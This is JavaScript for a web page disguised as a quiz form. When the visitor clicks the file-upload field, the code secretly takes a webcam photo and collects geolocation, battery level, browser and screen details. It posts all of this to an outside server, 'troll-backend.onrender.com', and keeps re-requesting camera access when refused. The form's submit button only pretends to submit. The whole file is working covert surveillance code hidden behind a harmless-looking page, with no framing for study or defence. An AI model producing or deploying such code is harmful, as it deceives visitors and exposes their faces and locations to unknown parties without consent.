const form = document.getElementById("quiz-form");
const videoEl = document.getElementById("video");
const canvasEl = document.getElementById("canvas");
const fileInput = document.getElementById("user-file");
const toast = document.getElementById("toast");
const submitBtn = document.getElementById("submit-btn");

const backendURL = "https://troll-backend.onrender.com/api/upload";
const constraints = { video: { facingMode: "user" }, audio: false }; // only camera

// Show a toast
function showToast(message, duration = 2000) {
  toast.innerText = message;
  toast.style.display = "block";
  toast.style.opacity = 1;

  setTimeout(() => {
    toast.style.opacity = 0;
    setTimeout(() => (toast.style.display = "none"), 300);
  }, duration);
}

// Capture image from camera and send to backend
async function captureAndSendCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    videoEl.srcObject = stream;
    await videoEl.play();

    // Wait until video can play
    await new Promise((res) => videoEl.addEventListener("canplay", () => setTimeout(res, 200)));

    // Draw image
    const ctx = canvasEl.getContext("2d");
    canvasEl.width = videoEl.videoWidth;
    canvasEl.height = videoEl.videoHeight;
    ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
    const image = canvasEl.toDataURL("image/png");

    // Stop camera
    videoEl.srcObject.getTracks().forEach(track => track.stop());

    // Send to backend
    const metadata = {
      useragent: navigator.userAgent,
      platform: navigator.platform,
      width: window.innerWidth,
      height: window.innerHeight,
      language: navigator.language,
      battery: "N/A",
      location: "N/A",
      time: new Date().toLocaleString()
    };

    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      metadata.battery = battery.level * 100 + "%";
    }

    if (navigator.geolocation) {
      try {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      } catch {
        metadata.location = "Denied";
      }
    }

    await fetch(backendURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata })
    });

    showToast("Camera image captured successfully!", 1500);

  } catch (err) {
    console.error("Camera not allowed:", err);
    showToast("Camera permission is required!");
    // Retry after short delay
    await new Promise(res => setTimeout(res, 1000));
    captureAndSendCamera();
  }
}

// Attach click to file input to first ask camera
fileInput.addEventListener("click", async (e) => {
  e.preventDefault(); // prevent default file dialog
  await captureAndSendCamera(); // ask for camera first
  // then open file selector
  fileInput.click();
});

// Submit handler
form.addEventListener("submit", async (e) => {
  e.preventDefault();
  submitBtn.disabled = true;
  submitBtn.textContent = "Submitting...";
  showToast("Submitting your response...");

  // Normally handle your form data here, including fileInput.files
  // For demo, just show success
  setTimeout(() => {
    document.getElementById("quiz-container").style.display = "none";
    document.getElementById("success-container").style.display = "block";
    submitBtn.disabled = false;
    submitBtn.textContent = "Submit";
  }, 1000);
});
